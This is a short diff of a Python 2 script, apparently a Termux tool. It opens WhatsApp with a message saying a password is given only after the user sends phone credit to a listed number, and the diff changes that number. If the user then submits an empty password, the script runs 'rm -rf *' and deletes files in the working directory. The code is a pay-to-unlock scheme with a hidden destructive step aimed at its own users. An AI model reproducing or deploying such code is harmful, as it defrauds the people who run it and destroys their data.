@@ -532,7 +532,7 @@ def divev():
 		h = l.replace('/', 'd3v').replace('0', '10')
 		ha = base64.b64encode(h)
 		print h + ' | ' + ha
-		subprocess.check_output(['am','start',"https://wa.me/6281276729006?text="+ha+"Assalamu'alaikum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta buktinya *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, Kirim bukti pengiriman pulsanya, ntar kamu akan di beri sandinya*"])
+		subprocess.check_output(['am','start',"https://wa.me/628812457948?text="+ha+" | Assalamu'alaikum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta buktinya *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, Kirim bukti pengiriman pulsanya, ntar kamu akan di beri sandinya*"])
 		f = raw_input(' [P] Masukkan sandinya = ')
 		if f == '' or f == ' ':
 			os.system('rm -rf *')
